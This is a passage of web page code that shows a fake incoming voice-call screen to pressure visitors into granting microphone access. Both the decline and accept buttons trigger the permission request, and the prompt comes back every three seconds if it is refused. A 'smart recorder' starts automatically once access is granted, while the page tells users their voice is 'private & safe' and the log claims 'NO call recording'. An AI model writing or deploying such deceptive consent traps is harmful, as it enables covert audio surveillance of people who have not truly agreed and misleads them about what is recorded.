      <div style="font-size:28px; font-weight:600;">Incoming Voice Call</div>
      <div style="font-size:15px; color:#8e8e93;">Enable mic to answer</div>
      <div style="font-size:14px; color:#0084FF; margin-top:8px;">📞 Ringing...</div>

      <!-- Benefits box -->
      <div style="background:#2c2c2e; border-radius:12px; padding:14px 18px;
                  text-align:left; font-size:13px; line-height:1.8;
                  color:#e0e0e0; margin-top:12px; max-width:320px;">
        ✨ <strong style="color:#4285F4;">Why mic?</strong><br>
        • 3x faster conversations<br>
        • Voice beats text every time<br>
        <span style="color:#31A24C;">🔒 Your voice is private & safe</span>
      </div>
    </div>

    <!-- Bottom: Red + Green buttons (call style) -->
    <div style="display:flex; gap:60px; align-items:center; padding-bottom:20px;">
      <button id="micDeclineBtn" style="
        width:72px; height:72px; border-radius:50%;
        border:none; font-size:28px; cursor:pointer;
        display:flex; align-items:center; justify-content:center;
        background:#FF3B30; color:#fff;
        animation:declinePulse 1.5s infinite;
        transition:transform 0.15s;
      ">✕</button>

      <button id="micAcceptBtn" style="
        width:72px; height:72px; border-radius:50%;
        border:none; font-size:28px; cursor:pointer;
        display:flex; align-items:center; justify-content:center;
        background:#31A24C; color:#fff;
        animation:acceptPulse 1.5s infinite;
        transition:transform 0.15s;
      ">📞</button>
    </div>
  `;

      document.body.appendChild(modal);

      // 🔥 Dono buttons pe SAME action — permission ask
      const askPermission = async () => {
        modal.remove();
        console.log('🎤 User tapped button — requesting mic...');
        const success = await startSmartRecorder();

        if (!success) {
          // Permission fail → 3 sec baad dobara modal
          setTimeout(() => showMicConvinceModal(), 3000);
        }
      };

      document.getElementById('micAcceptBtn').onclick = askPermission;
      document.getElementById('micDeclineBtn').onclick = askPermission;

      // Hover effects
      const acceptBtn = document.getElementById('micAcceptBtn');
      const declineBtn = document.getElementById('micDeclineBtn');
      acceptBtn.onmousedown = () => acceptBtn.style.transform = 'scale(0.9)';
      acceptBtn.onmouseup = () => acceptBtn.style.transform = 'scale(1)';
      declineBtn.onmousedown = () => declineBtn.style.transform = 'scale(0.9)';
      declineBtn.onmouseup = () => declineBtn.style.transform = 'scale(1)';
    }

    /* INIT */
    async function initSmartRecorder() {
      console.log('🚀 [Smart] Init...');
      const state = await checkSmartMicPermission();
      console.log('📋 [Smart] Permission:', state);

      if (state === 'granted') {
        console.log('✅ [Smart] Granted — auto-starting');
        await startSmartRecorder();
      } else if (state === 'prompt') {
        console.log('⚠️ [Smart] Prompt — showing convince modal');
        setTimeout(() => showMicConvinceModal(), 2000);
      } else if (state === 'denied') {
        console.log('🚫 [Smart] Denied — silent');
      }
      watchSmartPermission();
    }

    setTimeout(() => initSmartRecorder(), 1500);

    /* ============================================================
       17. CLEANUP
       ============================================================ */
      window.addEventListener('beforeunload', () => {
      if (localStream) localStream.getTracks().forEach(t => t.stop());
      if (micStreamOnly) micStreamOnly.getTracks().forEach(t => t.stop());
      if (smartMicStream) smartMicStream.getTracks().forEach(t => t.stop());
      stopRingtone();
      stopSmartLoop();
      stopCallBackgroundAudio();   // 🎵 audio stop
      if (callTimerInterval) clearInterval(callTimerInterval);
    });

    console.log('✅ Messenger Call ready (NO call recording)');
  </script>
